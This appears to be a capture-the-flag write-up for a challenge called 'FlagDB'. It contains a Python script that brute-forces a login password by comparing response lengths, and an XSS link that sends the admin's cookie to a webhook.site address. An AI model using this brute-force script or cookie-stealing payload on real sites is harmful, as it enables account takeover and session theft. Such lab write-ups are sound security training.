# FlagDB

Here we knew that Jammie was the username so in order to connect to the site we had to figure out the password.

So, we made a script that automatically brute forces passwords from this git: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/Pwdb_top-10000.txt

```python
import requests

url = "http://141.85.224.118:7081/"
wordlist = "passwords.txt"  
data_field = "password"    

# First, get the baseline response length
baseline = requests.post(url, data={data_field: "wrongpassword"}).text
baseline_length = len(baseline)

print(f"[i] Baseline response length: {baseline_length}")

with open(wordlist, "r") as file:
    for password in file:
        password = password.strip()
        data = {data_field: password}
        
        response = requests.post(url, data=data)
        response_length = len(response.text)

        print(f"[-] Tried: {password} | Length: {response_length}")

        if response_length != baseline_length:
            print(f"[+] Possible match! Password: {password}")
            break
```

And then we are logged in as Jamie, and we figure out that we need to contact the admin on staff @ web with this link to steal the cookie and steal the session of admin by using this link:

```
http://141.85.224.118:7081/?nickname=<script>fetch('/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/6a985bb3-a95b-439f-9de3-791071bb4aea',{method:'POST',body:document.cookie}))</script>
```

![img](https://media.discordapp.net/attachments/1392091689140752385/1393635384272879666/image.png?ex=68753518&is=6873e398&hm=3b9c4848bb9ad681405d854c2e43df80c7798159c2b897a60ce1e0ef11072397&=&format=webp&quality=lossless)
